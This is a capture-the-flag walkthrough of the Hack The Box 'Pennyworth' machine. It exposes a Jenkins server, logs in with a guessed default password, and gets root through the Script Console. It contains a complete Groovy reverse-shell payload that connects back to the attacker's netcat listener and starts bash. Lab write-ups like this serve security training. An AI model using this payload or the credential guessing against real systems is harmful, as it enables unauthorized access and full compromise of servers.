# Pennyworth – Hack The Box Walkthrough  
### Prepared by: 0ne-nine9, ilinor  

---

## Introduction

In the vast landscape of cybersecurity, vulnerabilities are the gateways attackers exploit to breach systems. One such category — **Remote Code Execution (RCE)** — stands among the most dangerous! Vulnerabilities are often tracked using **CVEs** (Common Vulnerabilities and Exposures), and scored with a **CVSS** rating from 0 (Informational) to 10 (Critical). A key trait of any severe vulnerability is how it impacts the **CIA Triad**: Confidentiality, Integrity, and Availability.

This write-up covers the **Pennyworth** machine: Jenkins exposure, weak or default credentials, and Groovy-based remote code execution leading to elevated access.

---

## Enumeration

We start, as always, with **Nmap**, our reconnaissance Swiss army knife:

```bash
nmap -sC -sV -oA nmap/pennyworth 10.10.11.143
```

- `-sC`: Default scripts (for banner grabbing, etc.)
- `-sV`: Version detection
- `-oA`: Save output to all formats

 **Findings**:

```text
8080/tcp open  http    Jetty 9.4.39.v20210325
```

We observe **Jetty** running on port **8080**, not the usual port 80. This implies we must access the service via:

```text
http://10.10.11.143:8080/
```

In a browser, the service presents a **Jenkins** web interface.

---

## What Is Jenkins?

Jenkins is a free and open-source automation server. It powers DevOps pipelines — automating building, testing, and deployment of applications. Because it runs system-level tasks, any misconfiguration can be catastrophic.

---

## Bruteforce Login Attempt

Facing a Jenkins login page, we immediately try a series of **common weak credential pairs**:

- admin:admin  
- root:root  
- admin:password  
- **root:password**  SUCCESS!

Jenkins **Manage Jenkins** / admin functions are accessible with the recovered credentials.

---

## Foothold via Jenkins Script Console

Jenkins includes a **Script Console**, which allows administrators to run **Groovy scripts** directly on the server — a perfect attack vector for RCE if accessed by unauthorized users.

Navigate to:

```text
Manage Jenkins > Script Console
```

Or go directly:

```text
http://10.10.11.143:8080/script
```

---

## Getting a Reverse Shell with Groovy

Use a standard **Groovy** reverse-shell snippet (from vendor documentation or trusted security references) and adapt host/port values.

First, grab your Kali’s VPN IP:

```bash
ip a | grep tun0
```

Assume it’s: `10.10.14.7`. Now start a listener:

```bash
nc -lvnp 8000
```

Prepare the Groovy payload by replacing `{your_IP}` with your Kali IP:

```groovy
String host="10.10.14.7";
int port=8000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream();
while(!s.isClosed()) {
  while(pi.available()>0) so.write(pi.read());
  while(pe.available()>0) so.write(pe.read());
  while(si.available()>0) po.write(si.read());
  so.flush(); po.flush();
  Thread.sleep(50);
  try { p.exitValue(); break; } catch (Exception e) {}
};
p.destroy();
s.close();
```

 Breakdown:
- `host` and `port`: tell the target where to connect.
- `cmd`: `/bin/bash` since this is a Linux box.
- The loop: keeps the connection alive, relaying input/output between you and the target.

Paste it into the **Script Console**, click **Run**...

The listener should then show an incoming connection.

---

## Interactive Shell Access

With execution confirmed, validate the session and stabilize if needed:

```bash
whoami
id
```

 Output:

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

YOU. ARE. GOD. MODE. 

Validate execution with:

```bash
cd /root
ls
cat root.txt
```

 Flag Captured!

---

## Conclusion

This machine demonstrates how critical **default credentials**, **outdated services**, and **misconfigured admin panels** can be for exploitation. The entire attack path:

1. **Identify Jenkins on Jetty (port 8080)**
2. **Brute-force weak credentials**
3. **Access Script Console**
4. **Execute Groovy reverse shell**
5. **Gain root shell & capture flag**

This attack mimics real-world scenarios where DevOps tools are misconfigured or left exposed. Always lock down your CI/CD systems and audit access regularly.

---

## Key Commands Recap

```bash
# Nmap Scan
nmap -sC -sV 10.10.11.143

# Netcat Listener
nc -lvnp 8000

# IP Address
ip a | grep tun0
```

---

## Bonus: Netcat Usage Explained

Netcat (`nc`) is a versatile tool for listening and connecting to ports:

- `-l`: Listen mode
- `-v`: Verbose
- `-n`: Numeric IP only (no DNS lookup)
- `-p`: Port number

```bash
nc -lvnp 8000
```

This line makes your Kali box act like a server, ready to receive a shell from the compromised target.

---

## Mission Complete

-  Initial Access via Jenkins weak creds  
-  RCE via Groovy Script Console  
-  Root shell obtained  
-  Root flag captured  

The exercise demonstrates Jenkins abuse leading to remote command execution and a reverse shell under realistic misconfiguration assumptions.

 That’s a wrap, hacker! On to the next box.
